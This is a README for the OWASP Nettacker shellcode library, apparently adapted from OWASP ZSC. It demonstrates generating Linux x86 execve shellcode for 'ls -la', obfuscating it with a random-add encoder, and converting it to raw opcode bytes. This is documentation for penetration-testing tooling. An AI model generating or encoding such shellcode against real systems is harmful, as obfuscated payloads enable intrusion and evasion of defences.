OWASP ZSC Shellcodes
=====================================

OWASP Nettacker shellcodes are located in here

* `generator` shellcode generator
* `encoder` shellcode encoders
* `opcoder` shellcode to opcode

license [OWASP ZSC](https://github.com/zdresearch/OWASP-ZSC)

* simple usage for this library

```python
In [1]: from lib.payload.shellcode.generator.linux_x86.system.engine import start

In [2]: from lib.payload.shellcode.encoder.linux_x86.system.add_random.engine import start as encode

In [3]: from lib.payload.shellcode.opcoder.linux_x86.engine import convert

In [4]: print(start("ls -la"))
push   $0xb
pop    %eax
cltd
push   %edx
push $0x616c9090
pop %ecx
shr    $0x10,%ecx
push %ecx

push $0x2d20736c

mov    %esp,%esi
push   %edx
push   $0x632d9090
pop    %ecx
shr    $0x10,%ecx
push   %ecx
mov    %esp,%ecx
push   %edx
push   $0x68
push   $0x7361622f
push   $0x6e69622f
mov    %esp,%ebx
push   %edx
push   %edi
push   %esi
push   %ecx
push   %ebx
mov    %esp,%ecx
int    $0x80

In [5]: print(encode(start("ls -la")))
xor %edx,%edx

push   %edx

push $0x71304b6f
pop %ebx
push $0xfc3badf
pop %eax
neg %eax
add %ebx,%eax
push %eax

pop %ecx
shr    $0x10,%ecx
push %ecx


push $0x70383849
pop %ebx
push $0x4317c4dd
pop %eax
neg %eax
add %ebx,%eax
push %eax


mov    %esp,%esi
push   %edx

push $0x69536879
pop %ebx
push $0x625d7e9
pop %eax
neg %eax
add %ebx,%eax
push %eax

pop    %ecx
shr    $0x10,%ecx
push   %ecx
mov    %esp,%ecx
push   %edx
push   $0x68

push $0x7944454c
pop %ebx
push $0x5e2e31d
pop %eax
neg %eax
add %ebx,%eax
push %eax


push $0x79377630
pop %ebx
push $0xace1401
pop %eax
neg %eax
add %ebx,%eax
push %eax

mov    %esp,%ebx
push   %edx
push   %edi
push   %esi
push   %ecx
push   %ebx
mov    %esp,%ecx
push $0x9
pop %eax
add $0x02,%eax

cltd

int    $0x80

In [6]: print(convert(start("ls -la")))
\x6a\x0b\x58\x99\x52\x68\x90\x90\x6c\x61\x59\xc1\xe9\x10\x51\x68\x6c\x73\x20\x2d\x89\xe6\x52\x68\x90\x90\x2d\x63\x59\xc1\xe9\x10\x51\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x51\x53\x89\xe1\xcd\x80

In [7]: print(convert(encode(start("ls -la"))))
\x31\xd2\x52\x68\x59\x5a\x55\x6d\x5b\x68\xc9\xc9\xe8\x0b\x58\xf7\xd8\x01\xd8\x50\x59\xc1\xe9\x10\x51\x68\x53\x38\x67\x6a\x5b\x68\xe7\xc4\x46\x3d\x58\xf7\xd8\x01\xd8\x50\x89\xe6\x52\x68\x44\x7a\x33\x7a\x5b\x68\xb4\xe9\x05\x17\x58\xf7\xd8\x01\xd8\x50\x59\xc1\xe9\x10\x51\x89\xe1\x52\x6a\x68\x68\x67\x59\x67\x75\x5b\x68\x38\xf7\x05\x02\x58\xf7\xd8\x01\xd8\x50\x68\x34\x53\x52\x76\x5b\x68\x05\xf1\xe8\x07\x58\xf7\xd8\x01\xd8\x50\x89\xe3\x52\x57\x56\x51\x53\x89\xe1\x6a\x0a\x58\x83\xc0\x01\x99\xcd\x80

In [8]:
```
